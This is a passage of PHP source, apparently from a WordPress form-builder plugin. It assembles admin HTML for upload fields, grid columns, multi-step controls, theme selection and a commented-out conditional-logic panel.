																				<div class="the_input_element form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].' uneditable-input span3 error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="'.$preferences['validation_preferences']['pref_invalid_file_ext_msg'].'" data-placement="bottom" data-trigger="fileinput"><i class="glyphicon glyphicon-file fileinput-exists"></i> <span class="fileinput-filename"></span></div>
																				<span class="input-group-addon btn btn-default btn-file postfix"><span class="glyphicon glyphicon-file"></span><input type="file" name="single_file" class="the_input_element"></span>
																				<a href="#" class="input-group-addon btn btn-default fileinput-exists" data-dismiss="fileinput"><span class="fa fa-trash-o"></span></a>
																				<div class="get_file_ext" style="display:none;">doc
docx
mpg
mpeg
mp3
mp4
odt
odp
ods
pdf
ppt
pptx
txt
xls
xlsx
</div>
																			  </div>
																			</div>';	
																		$output .= '</div>';
																	break;
																	
																	case 'upload-image':
																	
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																				  <div class="the_input_element fileinput-preview thumbnail" data-trigger="fileinput" style="width: 200px; height: 150px;"></div>
																				  <div>
																					<span class="btn btn-default btn-file the_input_element error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="'.$preferences['validation_preferences']['pref_invalid_file_ext_msg'].'" data-placement="top"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span><input type="file" name="image_upload" ></span>
																					<a href="#" class="btn btn-default fileinput-exists" data-dismiss="fileinput">Remove</a>
																				  </div>
																				  <div class="get_file_ext" style="display:none;">gif
jpg
jpeg
png
psd
tif
tiff</div>
																				</div>';	
																		$output .= '</div>';
																		$i=0;
																	break;
																	case 'preset_field':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="input-group">';
																				$output .= '<span class="input-group-addon prefix "><span class="fa '.$attr['icon'].'"></span></span>';
																				$sec_message = '';
																				if($attr['field_name']=='query')
																					{
																						$output .= '<textarea name="'.$nf_functions->format_name($attr['label']).'" placeholder=""  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message '.$set_required.' the_input_element textarea pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></textarea>';
																						
																					}
																				else
																					{
																					if($attr['field_name']=='email')
																						$sec_message = $preferences['validation_preferences']['pref_email_format_msg'];
																					if($attr['field_name']=='phone_number')
																						$sec_message = $preferences['validation_preferences']['pref_phone_format_msg'];
																					if($attr['field_name']=='url')
																						$sec_message = $preferences['validation_preferences']['pref_url_format_msg'];
																					if($attr['field_name']=='numbers')
																						$sec_message = $preferences['validation_preferences']['pref_numbers_format_msg'];
																					if($attr['field_name']=='char')
																						$sec_message = $preferences['validation_preferences']['pref_char_format_msg'];
																					
																					$output .= '<input type="text" name="'.$attr['field_name'].'" class="error_message '.$set_required.' '.$attr['format'].' form-control the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" data-secondary-message="'.$sec_message.'"/>';
																					}
																			
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	}
														
														if($attr['type']!='submit-button' && $attr['type']!='submit-button2')
															{
															if($label_pos == 'right')
																{
																$output .= '<div class="'.$label_width.' '.$align_class.' label_container '.(($preferences['field_preferences']['pref_label_text_align']) ? $preferences['field_preferences']['pref_label_text_align'] : 'align_left').'" '.$hide_label.'>';
																	$output .= '<label class="nf_title '.$preferences['field_preferences']['pref_label_size'].'"><span class="is_required glyphicon glyphicon-star btn-xs '.(($set_required) ? '' : 'hidden').'"></span><span class="the_label style_bold">'.$attr['label'].'</span><br /><small class="sub-text style_italic">'.(($preferences['field_preferences']['pref_sub_label']=='on') ? 'Sub label' : '').'</small></label>';
																$output .= '</div>';
																}
															}
																
																$output .= '<span class="help-block hidden">Help text...</span>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="field_settings" style="display:none">';
													$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
													$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
													$output .= '<div class="btn btn-default btn-xs duplicate_field"  	title="Duplicate Field"><i class="fa fa-files-o"></i></div>';
													$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
												$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
									$output .= '</div>';	
									$i = $i+0.08;
								}
					
					
					
					$other_elements = array
						(
					//HEADING
						'math_logic' => array
							(
							'category'	=>	'html_fields',
							'label'	=>	'Math Logic',
							'icon'	=>	'fa-calculator',
							'type' => 'math_logic',
							),
						'heading' => array
							(
							'category'	=>	'html_fields',
							'label'	=>	'Heading',
							'icon'	=>	'fa-header',
							'type' => 'heading',
							),
						'paragraph' => array
							(
							'category'	=>	'html_fields',
							'label'	=>	'Paragraph',
							'icon'	=>	'fa-align-justify',
							'type' => 'paragraph',
							),
						'html' => array
							(
							'category'	=>	'html_fields',
							'label'	=>	'HTML',
							'icon'	=>	'fa-code',
							'type' => 'html',
							),
						'divider' => array
							(
							'category'	=>	'html_fields',
							'label'	=>	'Divider',
							'icon'	=>	'fa-minus',
							'type' => 'divider',
							)						
						);
					$i=0;
					foreach($other_elements as $type=>$attr)
						{
						$output .= '<div class="field form_field all_fields '.$type.' '.$attr['category'].' '.(($set_required) ? 'required' : '').'" >';
										
							$output .= '<div class="draggable_object "   >';
								$output .= '<i title="'.$attr['label'].'" data-toggle="tooltip" class="fa '.$attr['icon'].'"></i><span class="object_title">'.$attr['label'].'</span>';
							$output .= '</div>';
							
							$output .= '<div id="form_object" class="form_object" style="display:none;">';
								$output .= '<div class="row">';
									$output .= '<div class="col-sm-12" id="field_container">';
										$output .= '<div class="row">';
											$output .= '<div class="col-sm-12 input_container">';
													
													switch($attr['type'])
														{
														case 'heading':
															$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
															$output .= '<h1 class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">Heading 1</h1>';
														break;
														case 'math_logic':
															$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
															$output .= '<h1 class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">{math_result}</h1>';
														break;
														case 'paragraph':
															$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
															$output .= '<div class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">Add your paragraph</div><div style="clear:both;"></div>';
														break;
														case 'html':
															$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
															$output .= '<div class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">Add Text or HTML</div><div style="clear:both;"></div>';
														break;
														case 'divider':
															$output .= '<hr class="the_input_element" />';
														break;
														}
													$output .= '</div>';
										$output .= '</div>';
									$output .= '</div>';
									
									$output .= '<div class="field_settings" style="display:none">';
										$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
										$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
										$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
									$output .= '</div>';
								$output .= '</div>';
							$output .= '</div>';
						$output .= '</div>';	
						$i = $i+0.08;	
						}
						
					
					
					
						
					
					
						$output .= '<div class="admin_wow hidden fadeInLeft dummy_animation '.$type.' '.$attr['category'].'" ></div>';
						$output .= '</div>'; //INNER
						$output .= '<div class="paddle p-left" style="display:none;">Fields</div>';
					$output .= '</div>';//FIELDS COLUMN
					
					
					
					
					
					
					
					$output .= '<div class="form-canvas-column" data-toggle="help-text" data-help-text="Form canvas: This is where your forms are built" data-wow-delay="0s">';
						
						$output .= '<div class="form-name-col nf_tutorial_step_6 nf_tutorial " title="Form Title Bar <span class=\'fa fa-close\'></span>" data-content="
					  		Your form title can be edited from here. You can also preview the form and save it from this bar. 
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						">';
						//$output .= '<div class="row">';	
							$output .= '<i class="fa fa-bars move_panel"></i>';
							$output .= '<div class="col-xs-7 form-name">';
								$output .= '<input type="text" name="form_name" data-content="Enter a form title" data-placement="bottom" class="form-control" id="form_name" placeholder="Enter Form Name" >';
							$output .= '</div>';
							$output .= '<div class="col-xs-1 form-save">';
								$output .= '<button class="form-preview btn btn-info form-control"><i class="fa fa-eye"></i></button> ';
							$output .= '</div>';
							$output .= '<div class="col-xs-4 form-save">';
								$output .= '<button class="save_nex_form btn btn-success form-control"><i class="glyphicon glyphicon-floppy-disk"></i>&nbsp;&nbsp;Save</button> ';
							$output .= '</div>';
							
						//$output .= '</div>';
					$output .= '</div>';
						$output .= '<div class="draggable-grid form-controls nf_tutorial_step_7 nf_tutorial " title="Grid &amp; Styles <span class=\'fa fa-close\'></span>" data-content="
					  		Add grids to your form by selection the columns (1-6). Also add bootstrap droppable panels from here.<br><br>Your Form Themes add-on dropdown with 24 preset selections is also found on this bar. <br><br>Note: you can go to full screen mode and back to make dragging elements into grids easier.  
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						">';
										
										$output .= '<div class="panel_label">';
											$output .= 'Grid:';
										$output .= '</div>';
										
										
										
										$output .= '<div class="field form_field grid grid-system grid-system-1">';
											$output .= '<div class="draggable_object">';
												$output .= '1';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="input-inner" data-svg="demo-input-1">';
														$output .= '<div class="row grid_row">';
															$output .= '<div class="grid_input_holder col-sm-12">';
																$output .= '<div class="panel grid-system grid-system panel-default">';
																	$output .= '<div class="panel-body">';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
																$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
																$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
																$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
																$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
															$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
										
		//2 Columns
										$output .= '<div class="field form_field grid grid-system grid-system-2">';
											$output .= '<div class="draggable_object">';
												$output .= '2';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row grid_row">';
																$output .= '<div class="grid_input_holder col-sm-6">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
																$output .= '</div>';
																$output .= '<div class="grid_input_holder col-sm-6">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
																$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
																$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
																$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
																$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
															$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
		//3 Columns								
										$output .= '<div class="field form_field grid grid-system grid-system-3">';
											$output .= '<div class="draggable_object">';
												$output .= '3';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row  grid_row">';
																$output .= '<div class="grid_input_holder col-sm-4">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
																$output .= '</div>';
																$output .= '<div class="grid_input_holder col-sm-4">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
																$output .= '</div>';
																$output .= '<div class="grid_input_holder col-sm-4">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="field_settings grid" style="display:none">';
																$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
																$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
																$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
																$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
		//4 Columns								
										$output .= '<div class="field form_field grid grid-system grid-system-4">';
											$output .= '<div class="draggable_object">';
												$output .= '4';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row grid_row">';
																$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
															$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
															$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
															$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
		//6 Columns								
										$output .= '<div class="field form_field grid grid-system grid-system-6">';
											$output .= '<div class="draggable_object">';
												$output .= '6';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row grid_row">';
																$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
															$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
															$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
															$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
														$output .= '</div>';
													$output .= '</div>';	
											$output .= '</div>';
											
										$output .= '</div>';
										$output .= '<div class="field form_field grid other-elements is_panel">';
											$output .= '<div class="draggable_object input-group-sm">';
												$output .= 'Panel';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="input-inner" data-svg="demo-input-1">';
														$output .= '<div class="row">';
															$output .= '<div class="input_holder col-sm-12">';
																$output .= '<div class="panel panel-default ">';
																	$output .= '<div class="panel-heading">Panel Heading</div>';
																	$output .= '<div class="panel-body the-panel-body">';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '<div class="field_settings grid" style="display:none">';
													$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
													$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
													$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
													$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
												$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
										$output .= '<button class="btn make_full_screen" data-toggle="tooltip" title="Full screen"><span class="fa fa-arrows-alt"></span></button>';
										//$output .= '<button class="btn form-styling" data-toggle="tooltip" title="Form Styling"><span class="fa fa-paint-brush"></span></button>';
										if ( is_plugin_active( 'nex-forms-themes-add-on/main.php' ) ) {
										$output .= '
										<select name="choose_form_theme" class="form-control ui-state-default">
							<option value="default" selected="selected">-- Form Theme --</option>
							<option value="default">Boostrap (default)</option>
							<option value="black-tie">black-tie</option>
							<option value="cupertino">cupertino</option>
							<option value="dark-hive">dark-hive</option>
							<option value="dot-luv">dot-luv</option>
							<option value="eggplant">eggplant</option>
							<option value="excite-bike">excite-bike</option>
							<option value="flick">flick</option>
							<option value="hot-sneaks">hot-sneaks</option>
							<option value="humanity">humanity</option>
							<option value="le-frog">le-frog</option>
							<option value="mint-choc">mint-choc</option>
							<option value="overcast">overcast</option>
							<option value="pepper-grinder">pepper-grinder</option>
							<option value="redmond">redmond</option>
							<option value="smoothness">smoothness</option>
							<option value="south-street">south-street</option>
							<option value="start">start</option>
							<option value="sunny">sunny</option>
							<option value="swanky-purse">swanky-purse</option>
							<option value="trontastic">trontastic</option>							
							<option value="ui-darkness">ui-darkness</option>
							<option value="ui-lightness">ui-lightness</option>
							<option value="vader">vader</option>
						</select>
										';
										}
						$output .= '<div class="controls-divider"></div>';
					$output .= '</div>';
//STEP CONTROLS						
					$output .= '<div class="step-controls form-controls nf_tutorial_step_8 nf_tutorial " title="Multi-Step Forms <span class=\'fa fa-close\'></span>" data-content="
					  		All your multi-step form needs are found on this bar. Add new steps, back and forward buttons and switch between steps to focus your step building and styling.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						">';
									
									$output .= '<div class="panel_label">';
										$output .= 'Step:&nbsp;</div>';
										
										$output .= '<div class="field form_field custom-fields grid step ui-draggable ui-draggable-handle">
														  <div class="draggable_object ">Add New Multi-Step</div>
														  <div style="display:none;" class="form_object" id="form_object">
															<div data-svg="demo-input-1" class="input-inner">
															  <div class="row">
																<div class="col-sm-12">
																  <div class="tab-pane grid-system grid-system panel panel-default">
																	<div class="zero-clipboard"><span class="btn-clipboard btn-clipboard-hover"><span class="badge the_step_number">Step</span>&nbsp;
																	  <div title="Delete field" class="btn btn-default btn-sm delete "><i class="glyphicon glyphicon-remove"></i></div>
																	  </span></div>
																	<div class="panel-body"></div>
																  </div>
																</div>
															  </div>
															</div>
														  </div>
														</div>';
										
										
										$output .= '<div class="field form_field all_fields  submit-button button_fields common_fields preset_fields special_fields selection_fields  ui-draggable ui-draggable-handle">
														  <div class="draggable_object "><i class="fa fa-backward" data-toggle="tooltip" title="" data-original-title="Back Button"></i></div>
														  <div style="display:none;" class="form_object" id="form_object">
															<div class="row">
															  <div id="field_container" class="col-sm-12">
																<div class="row">
																  <div class="col-sm-12  input_container">
																	<button class="prev-step svg_ready the_input_element btn btn-default">Back</button>
																  </div>
																</div>
															  </div>
															  <div style="display:none" class="field_settings">
																<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>
																<div title="Edit Field Attributes" class="btn btn-default btn-xs edit"><i class="fa fa-edit"></i></div>
																<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>
																<div title="Delete field" class="btn btn-default btn-xs delete"><i class="fa fa-close"></i></div>
															  </div>
															</div>
														  </div>
														</div>';
										$output .= '<div class="field form_field all_fields  submit-button button_fields common_fields preset_fields special_fields selection_fields  ui-draggable ui-draggable-handle">
														  <div class="draggable_object "><i class="fa fa-forward" data-toggle="tooltip" title="" data-original-title="Next Button"></i></div>
														  <div style="display:none;" class="form_object" id="form_object">
															<div class="row">
															  <div id="field_container" class="col-sm-12">
																<div class="row">
																  <div class="col-sm-12  input_container">
																	<button class="nex-step svg_ready the_input_element btn btn-default">Next</button>
																  </div>
																</div>
															  </div>
															  <div style="display:none" class="field_settings">
																<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>
																<div title="Edit Field Attributes" class="btn btn-default btn-xs edit"><i class="fa fa-edit"></i></div>
																<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>
																<div title="Delete field" class="btn btn-default btn-xs delete"><i class="fa fa-close"></i></div>
															  </div>
															</div>
														  </div>
														</div>';
										$output .= '
										 <select name="skip_to_step" class="form-control ui-state-default">
											 <option value="0" selected="selected">All steps</option>
										</select><span class="step_label">Show:</span>
										';
									$output .= '</div>';
								
						
						
						
						
						
							$output .= '<div class="panel-heading" style="display:none;">';
								$output .= '<span class="btn btn-primary glyphicon glyphicon-hand-down"></span>';
							$output .= '</div>';
							
							$output .= '<div class="clean_html hidden"></div>';
							$output .= '<div class="admin_html hidden"></div>';
							
							
							
							
							$output .= '<div class="panel-body nex-forms-container nf_tutorial_step_9 nf_tutorial " title="Form Canvas <span class=\'fa fa-close\'></span>" data-content="
					  		The form canvas is where all your form building and styling will occur.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						">';
							
							
							$output .= '</div>';
							
						$output .= '</div>';
						


/*****************************************************************/	
/******************CONDITIONAL LOGIC ***************************/
/*****************************************************************/						
					/*$output .= '<div class="con-logic-column right_hand_col simple_view col-xs-4">';
					
						$output .= '<i class="fa fa-bars move_panel"></i><div class="field-setting-categories">';
							$output .= '<div class="panel_head">Conditional Logic <div class="advanced_cl_options"><label for="adv_cl"><input type="checkbox" name="adv_cl" id="adv_cl" value="1"><span class="the_label">Show Advanced Options</span></label></div></div>';
							$output .= '<div id="close-logic" class="close-area">';
								$output .= '<span class="fa fa-close"></span>';
							$output .= '</div>';
						$output .= '</div>';
						
						
					
						$output .= '<div class="inner">';
							
							$output .= '<div class="conditional_logic_clonables hidden">';
							
							
							$output .= '<div class="panel new_rule">';
								$output .= '<div class="panel-heading advanced_options"><button aria-hidden="true" class="close delete_rule" type="button"><span class="fa fa-close "></span></button></div>';
								$output .= '<div class="panel-body">';
									//IF
									$output .= '<div class="col-xs-7 con_col">';
										$output .= '<h3 class="advanced_options"><strong><div class="badge rule_number">1</div>IF</strong> ';
											$output .= '<select id="operator" style="width:15%; float:none !important; display: inline" class="form-control" name="selector">';
												$output .= '<option value="any" selected="selected"> any </option>';
												$output .= '<option value="all"> all </option>';
											$output .= '</select> ';
										$output .= 'of these conditions are true</h3>';
										$output .= '<div class="get_rule_conditions">';
											$output .= '<div class="the_rule_conditions">';
											$output .= '<span class="statment_head"><div class="badge rule_number">1</div>IF</span> <select name="fields_for_conditions" class="form-control cl_field" style="width:33%;">';
													$output .= '<option selected="selected" value="0">-- Field --</option>';
												$output .= '</select>';
												$output .= '<select name="field_condition" class="form-control" style="width:28%;">';
													$output .= '<option selected="selected" value="0">-- Condition --</option>';
													$output .= '<option value="equal_to">Equal To</option>';
													$output .= '<option value="not_equal_to">Not Equal To</option>';
													$output .= '<option value="less_than">Less Than</option>';
													$output .= '<option value="greater_than">Greater Than</option>';
													/*$output .= '<option value="contains">Contains</option>';
													$output .= '<option value="not_contians">Does not Contain</option>';
													$output .= '<option value="is_empty">Is Empty</option>';*/
												/*$output .= '</select>';
												$output .= '<input type="text" name="conditional_value" class="form-control" style="width:28%;" placeholder="enter value">';
												$output .= '<button class="btn btn-sm btn-default delete_condition advanced_options" style="width:11%;"><span class="fa fa-close"></span></button><div style="clear:both;"></div>';
										$output .= '</div>';
									$output .= '</div>';
										
										$output .= '<button class="btn btn-sm btn-default add_condition advanced_options" style="width:100%;">Add Condition</button>';
									$output .= '</div>';
									
									//THEN
									$output .= '<div class="col-xs-5 con_col">';
										$output .= '<h3 class="advanced_options" style="margin-top:8px !important;padding-bottom:4px !important;">THEN</h3>';
										$output .= '<div class="get_rule_actions">';
											$output .= '<div class="the_rule_actions">';
											$output .= '<span class="statment_head">THEN</span> <select name="the_action" class="form-control" style="width:40%;">';
												$output .= '<option selected="selected" value="0">-- Action --</option>';
												$output .= '<option value="show">Show</option>';
												$output .= '<option value="hide">Hide</option>';
											$output .= '</select>';
											$output .= '<select name="cla_field" class="form-control" style="width:45%;">';
											$output .= '</select>';
											$output .= '<button class="btn btn-sm btn-default delete_action advanced_options" style="width:15%;"><span class="fa fa-close"></span></button>';
											$output .= '<button class="btn btn-sm btn-default delete_simple_rule" style="width:15%;"><span class="fa fa-close"></span></button>
											
											<div style="clear:both;"></div>';
														
											$output .= '</div>';
										$output .= '</div>';
										$output .= '<button class="btn btn-sm btn-default add_action advanced_options" style="width:100%;">Add Action</button>';
										
										$output .= '<div class="else_condition" style="display:none">';
											$output .= '<h3 style="margin-top:8px !important;padding-bottom:4px !important;">ELSE</h3>';
											$output .= '<input type="radio"  value="true" checked="checked"> Reverse actions<br />';
											$output .= '<input type="radio"  value="false"> Dont reverse actions';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
							$output .= '</div>';
							
							
							
							
							
							
							
							
							$output .= '<div class="set_rule_conditions">';
								$output .= '<select name="fields_for_conditions" class="form-control cl_field" style="width:33%;">';
									$output .= '<option selected="selected" value="0">-- Field --</option>';
								$output .= '</select>';
								$output .= '<select name="field_condition" class="form-control" style="width:28%;">';
									$output .= '<option selected="selected" value="0">-- Condition --</option>';
									$output .= '<option value="equal_to">Equal To</option>';
									$output .= '<option value="not_equal_to">Not Equal To</option>';
									$output .= '<option value="less_than">Less Than</option>';
									$output .= '<option value="greater_than">Greater Than</option>';
									/*$output .= '<option value="contains">Contains</option>';
									$output .= '<option value="not_contians">Does not Contain</option>';
									$output .= '<option value="is_empty">Is Empty</option>';*/
								/*$output .= '</select>';
								$output .= '<input type="text" name="conditional_value" class="form-control" style="width:28%;" placeholder="enter value">';
								$output .= '<button class="btn btn-sm btn-default delete_condition" style="width:11%;"><span class="fa fa-close"></span></button><div style="clear:both;"></div>';
							$output .= '</div>';
							
							
							$output .= '<div class="set_rule_actions">';
								
								$output .= '<select name="the_action" class="form-control" style="width:40%;">';
									$output .= '<option selected="selected" value="0">-- Action --</option>';
									$output .= '<option value="show">Show</option>';
									$output .= '<option value="hide">Hide</option>';
								$output .= '</select>';
								$output .= '<select name="cla_field" class="form-control" style="width:45%;">';
								$output .= '</select>';
								$output .= '<button class="btn btn-sm btn-default delete_action" style="width:15%;"><span class="fa fa-close"></span></button><div style="clear:both;"></div>';
							$output .= '</div>';
							
						
						
						
						$output .= '</div>';
						
						$output .= '<div id="field-settings-inner" class="conditions_wrapper">';
							$output .= '<div class="set_rules">';
							$output .= '</div>';
						$output .= '</div>';
						
						
						
					$output .= '</div>';
					
					$output .= '<div id="add_new_rule" class="btn btn-default add_new_rule">';
